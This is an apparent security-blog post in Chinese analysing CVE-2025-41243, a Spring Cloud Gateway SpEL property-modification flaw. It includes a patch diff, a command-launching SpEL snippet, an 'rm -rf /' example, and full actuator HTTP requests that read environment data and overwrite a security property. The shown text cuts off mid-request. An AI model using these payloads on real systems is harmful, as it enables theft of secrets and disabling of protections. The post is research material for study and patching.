<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="KaGty1" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  
  
  <title>
    
      CVE-2025-41243 Spring Cloud Gateway 环境属性修改漏洞 
      
      
      |
    
     KaGty1 &#39;s Personal Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
    <link rel="icon" href="/images/kagty1.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/kagty1.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">kagty1</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/ctf/">
          <a href="/ctf/">CTF</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">CVE-2025-41243 Spring Cloud Gateway 环境属性修改漏洞</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2025-09-25 17:25:59
        </span>
        
      </div>
      <div class="markdown-body">
        <h1 id="CVE-2025-41243-Spring-Cloud-Gateway-环境属性修改漏洞"><a href="#CVE-2025-41243-Spring-Cloud-Gateway-环境属性修改漏洞" class="headerlink" title="CVE-2025-41243 Spring Cloud Gateway 环境属性修改漏洞"></a>CVE-2025-41243 Spring Cloud Gateway 环境属性修改漏洞</h1><h3 id="Java-SpEL表达式注入"><a href="#Java-SpEL表达式注入" class="headerlink" title="Java SpEL表达式注入"></a>Java SpEL表达式注入</h3><p><code>SpEL</code>的设计是为了简化和动态化Spring应用程序的配置过程，可以减少在配置文件中的硬编码，可以动态地根据运行时的环境或条件来决定Bean的初始化或执行逻辑，而不需要修改源代码。</p>
<p>如下所示 -&gt; 调用<code>myBean</code>的<code>someMethod()</code>方法，并将返回值作为<code>value</code>的值。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exampleBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.Example&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;value&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;myBean.someMethod()&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是若未经任何过滤且<code>SpEL</code>解析的参数为攻击者可控，则会造成命令注入：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> <span class="string">&quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;open\&quot;,\&quot;-a\&quot;,\&quot;Calculator\&quot;&#125;).start()\n&quot;</span>;</span><br><span class="line">        <span class="type">SpelExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(input);</span><br><span class="line">        System.out.println(expression.getValue().toString());  <span class="comment">//在expression.getValue()处触发命令执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h3 id="漏洞前身-CVE-2022-2947-Spring-Cloud-Gateway-SpEL-RCE"><a href="#漏洞前身-CVE-2022-2947-Spring-Cloud-Gateway-SpEL-RCE" class="headerlink" title="漏洞前身 -&gt; CVE-2022-2947 Spring Cloud Gateway SpEL RCE"></a>漏洞前身 -&gt; CVE-2022-2947 Spring Cloud Gateway SpEL RCE</h3><p>参考分析 -&gt; <a target="_blank" rel="noopener" href="https://forum.butian.net/article/331">https://forum.butian.net/article/331</a></p>
<p>官方修复方案是将<code>StandardEvaluationContext</code>更换为<code>SimpleEvaluationContext</code>​</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>​<code>StandardEvaluationContext</code>​</th>
<th>​<code>SimpleEvaluationContext</code>​</th>
</tr>
</thead>
<tbody><tr>
<td><strong>功能完整性</strong></td>
<td>✅ 完整支持所有 SpEL 功能（方法调用、构造器、属性访问、Bean 引用等）</td>
<td>❌ 仅支持基本操作（属性读写、集合操作、运算符），<strong>不支持构造器调用和静态方法</strong></td>
</tr>
<tr>
<td><strong>性能</strong></td>
<td>较慢（需反射查找方法&#x2F;字段，缓存机制复杂）</td>
<td>更快（简化了类型转换和方法解析）</td>
</tr>
<tr>
<td><strong>安全性</strong></td>
<td>⚠️ 低：允许执行任意代码（如 <code>T(java.lang.Runtime).getRuntime().exec(&#39;rm -rf /&#39;)</code>）</td>
<td>✅ 高：禁用危险操作，防止代码注入</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>内部配置、受信任环境下的表达式求值</td>
<td>外部输入、用户提交的表达式、需要安全隔离的场景</td>
</tr>
<tr>
<td><strong>默认配置</strong></td>
<td>开启所有 SpEL 功能</td>
<td>严格限制，需显式启用部分功能</td>
</tr>
</tbody></table>
<p>‍</p>
<p>当<code>gateway</code>端点开启时，可以利用<code>POST /actuator/gateway/routes/xxxx</code>来创建一个新的路由</p>
<p>Actuator API文档 -&gt; <a target="_blank" rel="noopener" href="https://cloud.spring.io/spring-cloud-gateway/multi/multi__actuator_api.html">https://cloud.spring.io/spring-cloud-gateway/multi/multi__actuator_api.html</a></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250923201549-sdvnzs2.png" alt="image-20250923201549-sdvnzs2"></p>
<p>新增后利用<code>POST /actuator/gateway/refresh</code>刷新。</p>
<p>‍</p>
<p>打断点 -&gt; 先 <code>ShortcutConfigurable#getValue</code> -&gt; <code>RouteDefinitionRouteLocator#loadGatewayFilters</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250923210045-7melg0f.png" alt="image-20250923210045-7melg0f"></p>
<p>继续调用请求包中指定<code>filter</code>的<code>apply</code>方法 -&gt; <code>org.springframework.cloud.gateway.filter.factory.AddResponseHeaderGatewayFilterFactory#apply</code>​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddResponseHeaderGatewayFilterFactory</span> <span class="keyword">extends</span> <span class="title class_">AbstractNameValueGatewayFilterFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> GatewayFilter <span class="title function_">apply</span><span class="params">(NameValueConfig config)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GatewayFilter</span>() &#123;</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">				<span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> ServerWebExchangeUtils.expand(exchange, config.getValue());</span><br><span class="line">				exchange.getResponse().getHeaders().add(config.getName(), value);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> filterToStringCreator(AddResponseHeaderGatewayFilterFactory.<span class="built_in">this</span>)</span><br><span class="line">						.append(config.getName(), config.getValue()).toString();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>重点看一下对<code>CVE-2022-2947</code>漏洞的修复方案</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rawValue</span> <span class="operator">=</span> entryValue;</span><br><span class="line">        <span class="keyword">if</span> (entryValue != <span class="literal">null</span>) &#123;</span><br><span class="line">            rawValue = entryValue.trim();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object value;</span><br><span class="line">        <span class="keyword">if</span> (rawValue != <span class="literal">null</span> &amp;&amp; rawValue.startsWith(<span class="string">&quot;#&#123;&quot;</span>) &amp;&amp; entryValue.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">GatewayEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GatewayEvaluationContext</span>(beanFactory);</span><br><span class="line">            <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(entryValue, <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>());</span><br><span class="line">            value = expression.getValue(context);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            value = entryValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">GatewayEvaluationContext</span> <span class="keyword">implements</span> <span class="title class_">EvaluationContext</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> BeanFactoryResolver beanFactoryResolver;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> SimpleEvaluationContext delegate;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">GatewayEvaluationContext</span><span class="params">(BeanFactory beanFactory)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.beanFactoryResolver = <span class="keyword">new</span> <span class="title class_">BeanFactoryResolver</span>(beanFactory);</span><br><span class="line">            <span class="type">Environment</span> <span class="variable">env</span> <span class="operator">=</span> (Environment)beanFactory.getBean(Environment.class);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">restrictive</span> <span class="operator">=</span> (Boolean)env.getProperty(<span class="string">&quot;spring.cloud.gateway.restrictive-property-accessor.enabled&quot;</span>, Boolean.class, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (restrictive) &#123;</span><br><span class="line">                <span class="built_in">this</span>.delegate = SimpleEvaluationContext.forPropertyAccessors(<span class="keyword">new</span> <span class="title class_">PropertyAccessor</span>[]&#123;<span class="keyword">new</span> <span class="title class_">RestrictivePropertyAccessor</span>()&#125;).withMethodResolvers(<span class="keyword">new</span> <span class="title class_">MethodResolver</span>[]&#123;(context, targetObject, name, argumentTypes) -&gt; <span class="literal">null</span>&#125;).build();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.delegate = SimpleEvaluationContext.forReadOnlyDataBinding().build();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点为这句代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.delegate = SimpleEvaluationContext.forPropertyAccessors(<span class="keyword">new</span> <span class="title class_">PropertyAccessor</span>[]&#123;<span class="keyword">new</span> <span class="title class_">RestrictivePropertyAccessor</span>()&#125;).withMethodResolvers(<span class="keyword">new</span> <span class="title class_">MethodResolver</span>[]&#123;(context, targetObject, name, argumentTypes) -&gt; <span class="literal">null</span>&#125;).build();</span><br></pre></td></tr></table></figure>

<p>它调用<code>withMethodResolvers(new MethodResolver[]&#123;(context, targetObject, name, argumentTypes) -&gt; null&#125;)</code>，顾名思义，<code>MethodResolver</code>用于解析和调用对象的方法。在<code>SpEL</code>表达式中，如果遇到方法调用（例如 <code>targetObject.someMethod()</code>），<code>MethodResolver</code>会尝试解析这个方法并决定是否可以调用。<code>new MethodResolver[]&#123;(context, targetObject, name, argumentTypes) -&gt; null&#125;</code>代表始终返回<code>NULL</code>，代表禁止了所有方法调用，达到了修复的效果。</p>
<p>‍</p>
<p>‍</p>
<h3 id="CVE-2025-41243-Spring-Cloud-Gateway-环境属性修改漏洞-1"><a href="#CVE-2025-41243-Spring-Cloud-Gateway-环境属性修改漏洞-1" class="headerlink" title="CVE-2025-41243 Spring Cloud Gateway 环境属性修改漏洞"></a>CVE-2025-41243 Spring Cloud Gateway 环境属性修改漏洞</h3><p>比较<code>v4.2.4</code>和<code>v4.2.5</code>的代码，发现在<code>GatewayEvaluationContext</code>实例化中增加了一个新的限制方法-&gt;<code>withAssignmentDisabled</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250924192430-bgbtss3.png" alt="image-20250924192430-bgbtss3"></p>
<p>这个是防止赋值行为的。</p>
<p>对官方的测试代码稍作修改进行验证：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testNormalizeDefaultTypeWithSpelAssignmentAndInvalidInputFails</span><span class="params">()</span> &#123;</span><br><span class="line">	parser = <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">	<span class="type">ShortcutConfigurable</span> <span class="variable">shortcutConfigurable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShortcutConfigurable</span>() &#123;</span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">public</span> List&lt;String&gt; <span class="title function_">shortcutFieldOrder</span><span class="params">()</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> Arrays.asList(<span class="string">&quot;bean&quot;</span>, <span class="string">&quot;arg1&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	Map&lt;String, String&gt; args = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">	args.put(<span class="string">&quot;bean&quot;</span>, <span class="string">&quot;#&#123; @myMap[&#x27;my.flag&#x27;] = true&#125;&quot;</span>);</span><br><span class="line">	args.put(<span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;val1&quot;</span>);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		ShortcutType.DEFAULT.normalize(args, shortcutConfigurable, parser, <span class="built_in">this</span>.beanFactory);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">		e.printStackTrace(); <span class="comment">// 打印异常堆栈</span></span><br><span class="line">		<span class="keyword">throw</span> e; <span class="comment">// 再抛出，让断言仍然生效</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">       Map&lt;String, Object&gt; myMap = (Map&lt;String, Object&gt;) beanFactory.getBean(<span class="string">&quot;myMap&quot;</span>);</span><br><span class="line">	System.out.println(<span class="string">&quot;my.flag = &quot;</span> + myMap.get(<span class="string">&quot;my.flag&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">myMap</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当不加<code>withAssignmentDisabled</code>时，测试输出如下所示：</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250924193534-d8czz7h.png" alt="image-20250924193534-d8czz7h"></p>
<p>当加上<code>withAssignmentDisabled</code>后测试输出如下所示：抛出异常不允许进行赋值操作</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250924193822-fbo2b7p.png" alt="image-20250924193822-fbo2b7p"></p>
<p>有两个可以读的<code>Map</code>类型的 -&gt; <code>@systemProperties</code> 和 <code>@systemEnvironment</code>​</p>
<p>‍</p>
<p>读<code>@systemProperties</code>​</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test1 HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8889</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>368</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test1&quot;,</span><br><span class="line">  &quot;filters&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">      &quot;args&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">        &quot;value&quot;: &quot;#&#123;@systemProperties&#125;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;uri&quot;: &quot;http://xxxx.xxx:9999&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250925160812-hkadnvh.png" alt="image-20250925160812-hkadnvh"></p>
<p>‍</p>
<p>读<code>@systemEnvironment</code>，因为类型转换问题，需要用<code>@systemEnvironment[&#39;xxxxxx&#39;]</code>的形式进行读取</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test1 HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8889</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>368</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test1&quot;,</span><br><span class="line">  &quot;filters&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">      &quot;args&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">        &quot;value&quot;: &quot;#&#123;@systemEnvironment[&#x27;SHELL&#x27;]&#125;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;uri&quot;: &quot;http://xxxx.xxx:9999&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250925160946-vjo6j8f.png" alt="image-20250925160946-vjo6j8f"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250925161155-fjhvyau.png" alt="image-20250925161155-fjhvyau"></p>
<p>动态调试的时候发现允许赋值操作，新增属性<code>test</code>赋值</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test1 HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8889</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>368</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test1&quot;,</span><br><span class="line">  &quot;filters&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">      &quot;args&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">        &quot;value&quot;: &quot;#&#123; @systemProperties[&#x27;test&#x27;] = &#x27;attack&#x27;&#125;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;uri&quot;: &quot;http://xxxx.xxx:9999&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印<code>@systemProperties[&#39;test&#39;]</code>​</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test1 HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8889</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>368</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test1&quot;,</span><br><span class="line">  &quot;filters&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">      &quot;args&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">        &quot;value&quot;: &quot;#&#123;@systemProperties[&#x27;test&#x27;]&#125;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;uri&quot;: &quot;http://xxxx.xxx:9999&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功赋值</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250925162018-g5naeu3.png" alt="image-20250925162018-g5naeu3"></p>
<p>在QAX发布的安全公告中提及可以利用赋值的特性使<code>spring.cloud.gateway.restrictive-property-accessor.enabled</code>的值为<code>false</code>，这样就可以关掉大部分的安全检测去读取更多的敏感信息</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250925162416-z7kn0qx.png" alt="image-20250925162416-z7kn0qx"></p>
<p>会先从<code>env</code>中获取，若为<code>NULL</code>则采用默认值<code>true</code>​</p>
<p>那么利用赋值新增<code>spring.cloud.gateway.restrictive-property-accessor.enabled</code> 属性的值为<code>false</code>​</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test1 HTTP/1.1 </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8889</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>368</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test1&quot;,</span><br><span class="line">  &quot;filters&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">      &quot;args&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">        &quot;value&quot;: 